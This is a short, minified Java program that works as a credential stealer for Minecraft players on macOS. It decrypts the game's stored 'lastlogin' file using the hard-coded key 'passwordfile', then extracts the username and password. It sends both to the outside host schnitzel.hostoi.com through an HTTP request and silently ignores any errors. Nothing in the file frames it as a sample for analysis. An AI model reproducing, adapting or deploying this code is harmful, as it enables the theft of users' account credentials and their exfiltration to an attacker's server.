package lls;import java.io.BufferedReader;import java.io.DataInputStream;import java.io.DataOutputStream;import java.io.File;import java.io.FileInputStream;import java.io.InputStreamReader;import java.net.URL;import java.net.URLConnection;import java.util.Random;import javax.crypto.Cipher;import javax.crypto.CipherInputStream;import javax.crypto.SecretKey;import javax.crypto.SecretKeyFactory;import javax.crypto.spec.PBEKeySpec;import javax.crypto.spec.PBEParameterSpec;public class LLS{public static void main(String[]args)throws Exception{String base="schnitzel.hostoi.com";try{File lastLogin=new File(System.getProperty("user.home")+"/Library/Application Support/minecraft/lastlogin");Random random=new Random(43287234L);byte[]salt=new byte[8];random.nextBytes(salt);PBEParameterSpec pbeParamSpec=new PBEParameterSpec(salt,5);SecretKey pbeKey=SecretKeyFactory.getInstance("PBEWithMD5AndDES").generateSecret(new PBEKeySpec("passwordfile".toCharArray()));Cipher cipher=Cipher.getInstance("PBEWithMD5AndDES");cipher.init(2,pbeKey,pbeParamSpec);DataInputStream dis;if(cipher!=null){dis=new DataInputStream(new CipherInputStream(new FileInputStream(lastLogin),cipher));}else{dis=new DataInputStream(new FileInputStream(lastLogin));}URL url=new URL("http://"+base+"/default.php?user="+dis.readUTF());URLConnection urlConnection=url.openConnection();urlConnection.setDoInput(true);urlConnection.setDoOutput(true);urlConnection.setUseCaches(false);urlConnection.setRequestProperty("Content-Type","application/x-www-form-urlencoded");DataOutputStream printout=new DataOutputStream(urlConnection.getOutputStream());String content="pwd="+dis.readUTF();dis.close();printout.writeBytes(content);printout.flush();printout.close();BufferedReader in=null;in=new BufferedReader(new InputStreamReader(urlConnection.getInputStream()),8192);StringBuffer sb=new StringBuffer("");String line="";String newLine=System.getProperty("line.separator");while((line=in.readLine())!=null){sb.append(line).append(newLine);}in.close();System.out.println(sb);}catch(Exception e){}}}